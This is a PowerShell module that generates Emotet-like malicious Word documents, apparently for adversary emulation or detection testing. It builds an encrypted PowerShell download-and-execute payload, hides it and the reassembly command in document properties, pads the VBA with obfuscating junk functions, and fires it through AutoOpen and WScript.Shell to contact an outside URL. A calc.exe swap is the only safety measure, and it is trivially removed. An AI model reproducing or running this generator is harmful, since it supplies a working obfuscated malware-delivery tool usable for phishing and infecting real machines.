<#
 .SYNOPSIS
    A module to generate a Word Document containing Emotet-like obfuscated VBA and PowerShell payloads.

 .DESCRIPTION
    The code generates a PowerShell payload which is encrypted with a random key. A new Word document is generated,
    and the encrypted payload stored in the created Document's 'Comments' property. The VBA command to decrypt and 
    run the PowerShell is distrubuted over several Custom Document Properties, and a number of filler VBA functions
    are generated to pad-out the VBA. A 'run' function (called from AutoOpen) is generated which re-assembles the 
    code from the Custom Document Properties, calling cmd.exe to call PowerShell. This decrypts the encrypted 
    payload and runs it, ultimately calling out to a malicious domain before downloading and running an exe file.

    The malicious domain can be supplied or generated randomly. 

    For safety (i.e. if a valid domain is supplied, or indeed generated by the script), the code does not run the 
    downloaded .exe - a copy of calc.exe is run instead.

 .PARAMETER PayloadDownloadURL
    Used to supply a given URL as the payload download URL to which the PowerShell payload calls out to (to download an .exe file).
    This is optional - if not supplied, a URL will be randomly generated.

 .PARAMETER Debug
    Used to add some useful commands to the VBA/PowerShell payloads executed when the Document's macros are run.
    This includes echoing out the reassmbled VBA payload-launch command to a text file, as well as echoing out
	the result of executing the decrypted PowerShell payload (again, to a text file).

 .EXAMPLE
    Generate an Emotet-like payload and Word document using the supplied payload URL, with debug output configured:
    PS> Import-Module .\pseudotet.psm1
    PS> Generate-Pseudotet -PayloadDownloadURL "https://www.foobar.com/payload" -Debug $true
	
 .EXAMPLE
	Generate an Emotet-like payload with a random payload URL and no debug
	PS> Import-Module .\pseudotet.psm1
	PS> Generate-Pseudotet

 .NOTES
    Requires MS Word installed to generate the Document. 
    Probably requires MS Defender to be disabled, and for Word macros to be enabled on the victim machine.

    Resources used:
       https://blog.malwarebytes.com/threat-analysis/2018/05/malware-analysis-decoding-emotet-part-1/
       https://blog.malwarebytes.com/threat-analysis/2018/06/malware-analysis-decoding-emotet-part-2/
       https://gist.githubusercontent.com/softScheck/7fc477dd30958ca0fba7aeda0ee9c835/raw/b58da5faf28c7205d41e41a43cc3463be9905965/extracted_macro.vba

    Author: Darren King
    Last Edit: 2021-08-02
    Version: 1.0 - initial release
#>
function Generate-Pseudotet {
	param(
		[string]$PayloadDownloadURL=$null,
        [bool]$Debug=$false
	)

    $Banner = @"

██████╗ ███████╗███████╗██╗   ██╗██████╗  ██████╗ ████████╗███████╗████████╗
██╔══██╗██╔════╝██╔════╝██║   ██║██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝╚══██╔══╝
██████╔╝███████╗█████╗  ██║   ██║██║  ██║██║   ██║   ██║   █████╗     ██║   
██╔═══╝ ╚════██║██╔══╝  ██║   ██║██║  ██║██║   ██║   ██║   ██╔══╝     ██║   
██║     ███████║███████╗╚██████╔╝██████╔╝╚██████╔╝   ██║   ███████╗   ██║   
╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝   ╚═╝   
"@
    $Banner2 = @"
                 ~ Pseudo Emotet-like Document Generator ~
"@
    Write-Host $Banner -ForegroundColor Cyan
    Write-Host $Banner2 -ForegroundColor White

    Write-Info -Msg "Generating an Emotet-like payload"

    # Set the debug mode
    Set-Variable -Name "DebugMode" -Value $Debug -Scope "script"
    #$DebugMode = $Debug

    # Check we have a payload download URL and executable name - if not, generate random ones
    if (!$PayloadDownloadURL) {
        Write-Debug "Generating random payload download URL"
        $PayloadDownloadURL = Get-Random-URL
    }
    Write-Info "Using Payload Download URL:"
    Write-Host $PayloadDownloadURL -ForegroundColor Gray

    # Generate the payload download code (to encrypt)
    $codeToEncrypt = Get-Payload-Download-Code -PayloadDownloadURL $PayloadDownloadURL
    Write-Info "Generated PowerShell payload download code:"
    Write-Host $codeToEncrypt -ForegroundColor Gray
	
    # Get a random 24-byte/196-bit key
	$key = Get-Random-Bytes -Length 24
    Write-Info "Generated Random 24-bit key:"
    Write-Host $key -ForegroundColor Gray
    
    # Create a SecureString from the payload code
    $SecureCode = ConvertTo-SecureString $codeToEncrypt -AsPlainText -Force

    # Encrypt the secure code using the key
    $EncryptedCode = ConvertFrom-SecureString $SecureCode -Key $key
    Write-Info "Encrypted payload code with key:"
    Write-Host $EncryptedCode -ForegroundColor Gray

    # Hex encode the key
    $HexKey = ($key | ForEach-Object ToString X2) -join ''
    Write-Info "Key, hex-encoded:"
    Write-Host $HexKey -ForegroundColor Gray

    # Get the command to decrypt the payload (this is what is split up and hidden in Word document properties)
    # Not strictly required, but useful to show what the VBA will execute
    $PayloadDecryptCmd = Get-Payload-Decrypt-Command -HexKey $HexKey -EncryptedPayload $EncryptedCode
    Write-Info "Payload decryption command (what the VBA in the Word Document will execute):"
    Write-Host $PayloadDecryptCmd -ForegroundColor Gray

    # Get the Word document
    Generate-Word-Doc -HexKey $HexKey -EncryptedPayload $EncryptedCode

    Write-Info "Done! (PayloadDownloadURL: $PayloadDownloadURL)"
}

<#
Generates a PowerShell payload that constructs a WebClient object and attempts to execute the response (using 'iex').

This payload is encrypted and stored in the 'Comments' property of the generated Word document. The VBA macro code 
executes a WScript.Shell command, decrypting the payload with the appropriate key.
#>
function Get-Payload-Download-Code {
    param (
        [string]$PayloadDownloadURL=$null
    )
    # Generate randomly-named variables 
    $RandomVar = "$" + (Get-Random-String -Length 4)
    $IndexVarName = "$" + (Get-Random-String -Length 4)
    $WebClientVar = "$" + (Get-Random-String -Length 4)
    $ExeNameVar = "$" + (Get-Random-String -Length 4)
    $UrlVar = "$" + (Get-Random-String -Length 4)
    $ExePathVar = "$" + (Get-Random-String -Length 4)

    $UrlsString = ""

    # Generate some random URLs
    for($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 4); $i++) {
        $UrlsString += (Get-Random-URL) + "?"
    }

    $UrlsString += $PayloadDownloadURL
    $IndexVal = $i

    # Add some more random URLs
    for($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
        $UrlsString += "?" + (Get-Random-URL)
    }
    
    # Generate code block containing random vars
    $code = @"
$RandomVar=(New-Object Random)
$IndexVarName=$IndexVal
$WebClientVar=(New-Object System.Net.WebClient);
$ExeNameVar=$RandomVar."next"(10000,282133);
$UrlVar='$UrlsString'.Split('?')[$IndexVarName];
$ExePathVar=@(`$env:public,"\${ExeNameVar}",('.e'),'xe');
"@

    if ($DebugMode) {
        $code += @"

Write-Host "Download URL: $UrlVar";
Write-Host "EXE Path: `$($ExePathVar -join '')`n";
"@
    }

    $code += @"
try{$WebClientVar."DownloadFile"($UrlVar."ToString"(),$ExePathVar -Join '');}finally{}
try{cp "C:\Windows\System32\calc.exe" ($ExePathVar -join '')}finally{}
try{('Invoke-Item',($ExePathVar -Join '')) -Join ' '|iex}finally{}
"@

    return $code
}

<#
Generate a PS command that will be run from the VBA code to decrypt the PS payload with the given key.

This is not used by the code, other than to print to the script output (for testing etc). This command would
typically be invoked by the VBA macro code - this command is replicated in the 'Set-Document-Properties' 
function, where fragments of this command are set as Custom Document Properties on the Word doc. The VBA code
re-assembles the command by concatenating the CDPs and passing the result to WScript.Shell.
#>
function Get-Payload-Decrypt-Command {
    param(
        [string]$HexKey,
        [string]$EncryptedPayload
    )

    $cmd = "cmd /c powershell.exe `"((New-Object System.Net.NetworkCredential('', (ConvertTo-SecureString -k ([byte[]] -split ('$HexKey' -replace '..', '0x$& ')) '$EncryptedPayload'))).Password)|iex`""

    return $cmd
}

# =====================================================================
# Functions to generate the Word document
# =====================================================================

<#
Generates a macro-enabled Word document (.docm) containing a number of Custom Document Properties,
obfuscating a command which the VBA re-assembles and executes.

The encrypted payload contains the PowerShell code to contact the malicious domain. This function
creates the base Document, sets the required properties and initiates the generation of the macro
VBA code.
#>
function Generate-Word-Doc {
    param(
        [string]$HexKey,
        [string]$EncryptedPayload
    )

    $InstanceId = Get-Random-String -Length 6

    # Create a new Word Document
    $Word = New-Object -ComObject Word.Application
    $Word.Visible = $True
    $Doc = $Word.Documents.Add()

    # Set the document properties to hide the key and encrypted payload
    $CustomPropertyNames = Set-Document-Properties -HexKey $HexKey -EncryptedPayload $EncryptedPayload -Document $Doc

    # Create the VBA code and set on the doc
    $VBACode = Get-VBA-Code -CustomPropertyNames $CustomPropertyNames -InstanceId $InstanceId
    Write-Info "Generated VBA macro code to embed in Word document:"
    Write-Host $VBACode.Code -ForegroundColor Gray

    Write-Debug "VBA 'Run' Function (called from AutoOpen Sub):" # Useful to know if manually debugging/running in the Word doc
    Write-Host $VBACode.RunFunctionName -ForegroundColor Gray

    # Add code to document
    $VBComp = $Doc.VBProject.VBComponents.Add(1)
    $VBComp.CodeModule.AddFromString($VBACode.Code)

    # Save the generated doc to Temp files
    $OutputPath = "C:\Temp\Pseudotet-$($InstanceId).docm"
    Write-Info "Saving Word document to: $OutputPath"
    $Doc.SaveAs([REF]$OutputPath, 13) # '13' saves the document as wdFormatXMLDocumentMacroEnabled ('.docm')
    $Doc.Close()
}

<#
Sets randomly-named Custom Document Properties on the Word Document containing fragments of the WScript.Shell command
that is used to decrypt the encrypted PowerShell payload (which is saved in the Document's 'comments' property).
#>
function Set-Document-Properties {
    param(
        [string]$HexKey,
        [string]$EncryptedPayload,
        [Microsoft.Office.Interop.Word.DocumentClass]$Document
    )

    # Set custom properties
    $binding = "System.Reflection.BindingFlags" -as [type]       
    $customProperties = $Document.CustomDocumentProperties

    # Property names are generated randomly, but we need to keep track of them so our VBA script can reference them (for cmd reassembly)
    $PropertyNames = @()

    # The command to pass to WScript.Shell is in format:
    #   "cmd /c powershell.exe `"((New-Object System.Net.NetworkCredential('', (ConvertTo-SecureString -k ([byte[]] -split ('$HexKey' -replace '..', '0x$& ')) '$EncryptedPayload'))).Password)|iex`""
    # 
    # The fragments of the command, as well as the hex-encoded key (to decrypt the encrypted payload) are stored in custom document properties within the Document. The encrypted payload itself is
    # stored in the "Comments" built-in property
    $CmdFragments = @("WSc", "rip", "t.Sh", "ell", "cmd /C p", "owershell.ex","e `"((New-", "Object System.Net", ".NetworkCredential('', (", "ConvertTo-SecureString -k ([byte[]] ", "-split ('", $HexKey, "' -replace '..', '0x$& ')) '", "'))).Password)|iex`"")
    $PropNameCache = New-Object System.Collections.Generic.HashSet[string]
    
    # Add new document property for each fragment
    Write-Info "Setting VBA fragments in Custom Document Properties..."
    foreach($CmdFragment in $CmdFragments) {
        # Generate a random property name and store in the $PropertyNames array
        $PropName = Get-Random-String -Length 8 -Previous $PropNameCache
        $PropertyNames += $PropName

        [Array]$arrayArgs = $PropName,$false,4,$CmdFragment, $null

        Write-Host "    - Setting property " -NoNewLine 
        Write-Host $PropName -ForegroundColor Red -NoNewline
        Write-Host " = " -NoNewline
        Write-Host $CmdFragment -ForegroundColor Green

        # Get add the new document property to store the current fragment
        [System.__ComObject].InvokeMember("add", $binding::InvokeMethod, $null, $customProperties, $arrayArgs) | Out-Null
    }

    # Set the 'Comments' section on the built in properties - this will store the encrypted payload
    $builtInProperties = $Document.BuiltInDocumentProperties
    $CommentProp = [System.__ComObject].InvokeMember("Item", $binding::GetProperty, $null, $builtInProperties, "Comments")
    [System.__ComObject].InvokeMember("Value", $binding::SetProperty, $null, $CommentProp, $EncryptedPayload)

    # Update the document fields
    $Document.Fields.Update() | Out-Null

    return $PropertyNames

}

# =====================================================================
# Functions to generate the VBA macro code
# =====================================================================

<#
Generates the VBA code to be set on the document. This code is highly obfuscated and
contains a number of decoy/filler functions that are not actually used.
Inlucded in the VBA is a function used to return values from the Custom Document Properties
(i.e. the WScript.Shell fragments), as well as a "run" function, which assembles the command
from the Properties and attempts to run it.
#>
function Get-VBA-Code {
    param(
        [string[]] $CustomPropertyNames,
        [string]$InstanceId
    )

    # Keep a cache of strings generated and used
    $UniqueStrings = New-Object System.Collections.Generic.HashSet[string]

    $code = "" # "Attribute VB_Name=`"Module1`"`n`n"
    for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 4); $i++) {
        $code += Get-Random-VBA-Function
        $code += "`n"
    }

    # Generate function to retrieve CustomDocumentPropery
    $CDPGetterFunctionName = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    $code += Get-VBA-Custom-Document-Property-Getter -FunctionName $CDPGetterFunctionName -UniqueStrings $UniqueStrings

    # Generate the kick-off function
    $RunFunctionName = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    $code += Get-VBA-Run-Function -FunctionName $RunFunctionName -CDPGetterName $CDPGetterFunctionName -UniqueStrings $UniqueStrings -CustomPropertyNames $CustomPropertyNames -InstanceId $InstanceId

    # Add in the autoopen subroutine
    $code += "Sub autoopen()`n"
    $code += "$RunFunctionName`n"
    $code += "End Sub`n`n"

    # Some more random functions
    for ($i=0; $i -lt (Get-Random -Minimum 5 -Maximum 10); $i++) {
        $code += Get-Random-VBA-Function
        $code += "`n"
    }

    return @{
        Code = $code
        RunFunctionName = $RunFunctionName
    }
}

<#
Generates a random "noise" function as frequently seen in Emotet VBA vectors.
The generated function has a random name, random-named array variable with a random number of assignments to the array.
#>
function Get-Random-VBA-Function {
    param (
        [System.Collections.Generic.HashSet[string]]$UniqueStrings
    )

    $FunctionName = Get-Random-String -Length 10 (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings

    # Allocate a random size of the array var (between 5000-10000)
    $ArraySize = Get-Random -Minimum 5000 -Maximum 10000
    $ArrayName = Get-Random-String -Length 10 (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    # Keep track of the random indexes generated so as not to duplicate
    $IndexCache = New-Object System.Collections.Generic.HashSet[int]

    # Now generate the function body
    $Body = "Function $FunctionName($(Get-Random-String) As String)`n"
    $Body += "    Dim $ArrayName($ArraySize)`n"

    # Get some random assignments
    $Body += Get-Random-VBA-Array-Contents -ArraySize $ArraySize -ArrayName $ArrayName -IndexCache $IndexCache -UniqueStrings $UniqueStrings

    # Actually encode the data we want into the function

    # Get some more random assignments
    $Body += Get-Random-VBA-Array-Contents -ArraySize $ArraySize -ArrayName $ArrayName -IndexCache $IndexCache -UniqueStrings $UniqueStrings

    # Throw in a loop that does nothing
    $LoopFrom = Get-Random -Minimum 100 -Maximum 4000
    $LoopTo = Get-Random -Minimum $LoopFrom -Maximum 5000
    $LoopVar = Get-Random-String -Length 8 -Previous $UniqueStrings
    $Body += "    For $LoopVar = $LoopFrom To $LoopTo`n"
    $Body += "        $ArrayName($LoopVar) = $LoopVar`n"
    $Body += "    Next`n"

    # Add in some random assignments using indexes from the array
    for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 5); $i++) {
        $Str = "    $(Get-Random-String -Length 7 -Previous $UniqueStrings) = "
        for ($j=0; $j -lt (Get-Random -Minimum 4 -Maximum 10); $j++) {
            if ($j -gt 0) {
                $Str += " + "
            }
            $Str += "$ArrayName($(Get-Random -Minimum 100 -Maximum $ArraySize))"
        }
        $Body += $Str + "`n"
    }

    $Body += "End Function`n"

    return $Body

}

<#
Generates a code block containing a random number of assignments to an array.

Assignments are generated at random, and can be integer assignments, string
assignments, a random variable assignment or a calculation, i.e.:

    SrGPDtnepsZ(4520) = 4721
	SrGPDtnepsZ(3908) = "WnFmeKgcP"
	SrGPDtnepsZ(79) = uDLZbSACx
	SrGPDtnepsZ(1019) = 6267 + 4071 / 215 / 3455 / 1127 - 6146 - 6217 - 8856 + 6066 + 6423 + 3276

The array name is passed in as a parameter (to provide continuity with previous array blocks).
Indexes are generated randomly, as are variable names, strings etc.
#>
function Get-Random-VBA-Array-Contents {
    param(
        [int]$ArraySize,
        [string]$ArrayName,
        [System.Collections.Generic.HashSet[int]]$IndexCache,
        [System.Collections.Generic.HashSet[string]]$UniqueStrings
    )

    $Contents = ""
    $loops = Get-Random -Minimum 5 -Maximum 11
    for ($i=0; $i -lt $loops; $i++) {
        $ArrayIndex = Get-Unique-Random -Minimum 100 -Maximum $ArraySize -Previous $IndexCache

        # Four types of filler - 
        # 1. Random integer assignment
        # 2. Random string assignment
        # 3. Random variable assignment (doesn't matter if var doesn't exist)
        # 4. Calculation
        $FillerCode = switch(Get-Random -Minimum 1 -Maximum 5) 
        {
            1 { "CInt(" + (Get-Random -Minimum 100 -Maximum 10000).ToString() + ")" }
            2 { "(`"" + (Get-Random-String -Length 10 -Previous $UniqueStrings) + "`")" }
            3 { (Get-Random-String -Length 10 -Previous $UniqueStrings) }
            4 { Get-Random-VBA-Calculation }
        }
        
        $Contents += "    $ArrayName($ArrayIndex) = $FillerCode`n"
    }
    return $Contents
}

<#
Generates code that does a random calculation to fill-out the function.
Numbers and ops are randomly generated, i.e.:

    6267 + 4071 / 215 / 3455 / 1127 - 6146 - 6217 - 8856 + 6066 + 6423 + 3276
#>
function Get-Random-VBA-Calculation {
    $Value = ""
    # Iterate for a random number of terms (between 8-15)
    for ($i=0; $i -lt $(Get-Random -Minimum 8 -Maximum 15); $i++) {
        if ($i -gt 0) {
            # Get a random operation
            $Value += " " + ("+","-","/" | Get-Random) + " "
        }
        $Value += "CLng(" + (Get-Random -Minimum 100 -Maximum 10000).ToString() + ")"
    }
    return $Value
}

<#
Generates a unique random integer, based on a set of previously generated numbers
#>
function Get-Unique-Random {
    param(
        [int]$Minimum=0,
        [int]$Maximum=1000,
        [System.Collections.Generic.HashSet[int]]$Previous
    )

    Do {
        $val = Get-Random -Minimum $Minimum -Maximum $Maximum
    } While($Previous -contains $val -And $Previous.Count -lt ($Maximum - $Minimum))

    # Check if we've exhausted unique numbers in range
    if($Previous.Contains($val)) {
        Write-Host "Error - exhausted unique numbers in range [$Minimum - $Maximum]"
        return $null
    }

    # Should have a unique value here, add it to our 'Previous' list
    $res = $Previous.Add($val)

    return $val
}

<#
Generates a VBA function that contains the appropriate method and return statement
to return Custom Document Property values.

The generated function is randomly named, and contains other randomly generated statements
and code blocks.
#>
function Get-VBA-Custom-Document-Property-Getter {
    param(
        [string]$FunctionName,
        [System.Collections.Generic.HashSet[string]]$UniqueStrings
    )

    # Random parameter name
    $ParamName = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    
    $Body = "Public Function ${FunctionName}($ParamName)`n"
    $Body += "On Error Resume Next`n"
    # Throw in some random VBA assignments
    $Body += Get-Random-VBA-Assignments -UniqueStrings $UniqueStrings

    $ResultVarName = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    $Body += "$ResultVarName = ActiveDocument.CustomDocumentProperties($ParamName)`n"
    # Assign the custom property lookup to the name of the function (to return value)
    $Body += "$FunctionName = $ResultVarName`n"

    # More random VBA assignments to obfuscate things
    $Body += Get-Random-VBA-Assignments -UniqueStrings $UniqueStrings
    $Body += "End Function`n`n"
    
    return $Body
}

<#
Generates a string of random variable concatenation, i.e.:
    MmMRXtv = zKecGnebZ + HSLCRHhWhTY = RENNUypsA
#>
function Get-Random-VBA-Assignments {
    param(
        [System.Collections.Generic.HashSet[string]]$UniqueStrings
    )

    $Line = ""
    for ($i=0; $i -lt $(Get-Random -Minimum 4 -Maximum 10); $i++) {
        $Var1Name = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
        $Var2Name = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
        $Line += "$Var1Name = " + (Get-Random-VBA-Concat -UniqueStrings $UniqueStrings) + " = $Var2Name`n"
    }
    return $Line
}

<#
Append a number of random strings that look like variable names, i.e.:
    KeyeUgtkrd + HuPuESkLhy + zemaEVc + SuGvNTkzE + YPCrwmVkT + HptZKepNwvX + vmuvTSP + KxxGMpUX + RkbrfNxRNWd
#>
function Get-Random-VBA-Concat {
    param(
        [System.Collections.Generic.HashSet[string]]$UniqueStrings
    )

    $Line = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    for ($i=0; $i -lt (Get-Random -Minimum 3 -Maximum 6); $i++) {
        $VarName = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
        $Line += " + $VarName"
    }
    return $Line
}

<#
Generates the function that is called from the "AutoOpen" function.
This function actually does the work of reassembling the WScript.Shell 'run' function
from the Custom Document Properties, and running the PowerShell command to decrypt the
encrypted PowerShell payload.
#>
function Get-VBA-Run-Function {
    param(
        [string]$FunctionName,
        [string]$CDPGetterName,
        [System.Collections.Generic.HashSet[string]]$UniqueStrings,
        [string[]]$CustomPropertyNames,
        [string]$InstanceId
    )

    $Body = "Public Function ${FunctionName}()`n"
    $Body += "On Error Resume Next`n"

    # 1. Throw in some random assignments
    $Body += Get-Random-VBA-Assignments -UniqueStrings $UniqueStrings

    # 2. Generate the line that digs out the CDP to reconstruct the "WScript.Shell" object name (using first 4 custom document properties)
    $ExecVarName = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    $Body += "$ExecVarName = $CDPGetterName(`"$($CustomPropertyNames[1])`") + $CDPGetterName(`"$($CustomPropertyNames[2])`") + $CDPGetterName(`"$($CustomPropertyNames[3])`") + $CDPGetterName(`"$($CustomPropertyNames[4])`")`n"

    # 3. More random assignments
    $Body += Get-Random-VBA-Assignments -UniqueStrings $UniqueStrings

    # 4. Dig out more junk from the CDPs to construct payload
    $ExecVar2Name = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    $Body += "$ExecVar2Name = `"`" + $(Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings) + $(Get-Random-VBA-Concat -UniqueStrings $UniqueStrings)"
    for($i=5; $i -lt $CustomPropertyNames.Length - 1; $i++) {
        $RandomVar = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
        $Body += " + $CDPGetterName(`"$($CustomPropertyNames[$i])`")"
    }
    $Body += " + $(Get-Random-VBA-Concat -UniqueStrings $UniqueStrings)`n"

    # 5. Append previous payload to the stuff in ActiveDocument.BuiltInProperties("Comments")
    $ExecVar3Name = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    $RandomVars = Get-Random-String -Length (Get-Random -Minimum 8 -Maximum 15) -Previous $UniqueStrings
    $Body += "$ExecVar3Name = $ExecVar2Name + `"`" + ActiveDocument.BuiltInDocumentProperties(`"Comments`") + $(Get-Random-VBA-Concat -UniqueStrings $UniqueStrings) + $CDPGetterName(`"$($CustomPropertyNames[$CustomPropertyNames.Length - 1])`")`n"

    # 6. CreateObject and Run line
    # If in debug mode, output a line which writes the cmd to execute to a file in temp directory
    $ToExecute = $ExecVar3Name
    if ($DebugMode) {
        $CmdFile = "C:\Temp\pseudotet-cmd-$InstanceId.txt"
        $OutputFile = "C:\Temp\pseudotet-output-$InstanceId.txt"

        $Body += "CreateObject($ExecVarName).Run `"cmd /C echo `" + $ExecVar3Name + `" > $CmdFile`", 1`n" # output cmd to be run to file in temp

        $ToExecute += " + `" > $OutputFile`""
    }
    $ToExecute += " + " + (Get-Random-VBA-Concat -UniqueStrings $UniqueStrings)
    $Body += "CreateObject($ExecVarName).Run$ $ToExecute, 0`n"

    # 5. More random assignments
    $Body += Get-Random-VBA-Assignments -UniqueStrings $UniqueStrings

    $Body += "End Function`n`n"
    return $Body
}


# =====================================================================
# Helper functions to generate random bytes, strings etc
# =====================================================================

function Get-Random-Bytes {
	param(
		[int]$Length
	)
	
	$Bytes = @()
	$rnd = (New-Object Random)
	for ($i=0; $i -lt $Length;$i++) {
		$Bytes += $rnd.Next(0, 255)
	}
	return $Bytes
}

<#
Generates a random string of specified length, containing ASCII characters.
If $Previous is set, will generate a unique random string not clashing with the set of previous values generated
#>
function Get-Random-String {
    param(
        [int] $Length=5,
        [System.Collections.Generic.HashSet[string]]$Previous=$null
    )
    $str = ""
    Do {
        # Get random characters in ASCII range 65-90, 97-122
        $str  = -join ((65..90) + (97..122) | Get-Random -Count $Length | % {[char]$_})
    } While($Previous -ne $Null -and $Previous.Contains($str))

    # Add generated string to cache (if set)
    if ($Previous -ne $Null) {
        $Previous.Add($str)
    }

    return $str
}

function Get-Random-URL {
    $HostLength = Get-Random -Minimum 10 -Maximum 16
    $PathLength = Get-Random -Minimum 10 -Maximum 16
    $HostTLD = ("com","io","ru","co.uk","ws" | Get-Random)
    return "https://" + (Get-Random-String -Length $HostLength) + "." + $HostTLD + "/" + (Get-Random-String -Length $PathLength)
}

# =====================================================================
# Output helper functions
# =====================================================================

function Write-Info {
    param(
        [string]$Msg
    )
    
    Do-Write -Msg $Msg -Label "INFO" -LabelColor "Cyan"
}

function Write-Debug {
    param(
        [string]$Msg
    )
    
    Do-Write -Msg $Msg -Label "DEBUG" -LabelColor "Green"
}

function Write-Error {
    param(
        [string]$Msg
    )
    
    Do-Write -Msg $Msg -Label "ERROR" -LabelColor "Red"
}


function Do-Write {
    param(
        [string]$Msg,
        [string]$Label,
        [bool]$PrintLabel=$true,
        [string]$LabelColor
    )

    if ($PrintLabel) {
        Write-Host "[" -NoNewline -ForegroundColor Gray
        Write-Host $Label -NoNewline -ForegroundColor $LabelColor
        Write-Host "] " -NoNewline -ForegroundColor Gray
    }

    Write-Host $Msg
}

Export-ModuleMember -Function Generate-Pseudotet
